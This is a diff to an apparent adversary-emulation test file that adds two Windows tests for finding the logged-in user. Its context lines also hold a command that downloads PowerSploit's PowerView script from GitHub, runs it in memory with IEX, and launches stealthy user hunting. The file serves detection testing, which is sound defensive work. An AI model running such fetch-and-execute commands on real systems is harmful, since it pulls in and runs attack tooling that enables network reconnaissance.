@@ -51,3 +51,26 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
     name: powershell
+- name: User Discovery With Env Vars PowerShell Script
+  auto_generated_guid: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
+  description: Use the PowerShell environment variables to identify the current logged user.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
+      $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
+    cleanup_command: |
+      Remove-Item -Path .\CurrentactiveUser.txt -Force
+    name: powershell
+- name: GetCurrent User with PowerShell Script
+  auto_generated_guid: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
+  description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
+    cleanup_command: |
+      Remove-Item -Path .\CurrentUserObject.txt -Force
+    name: powershell
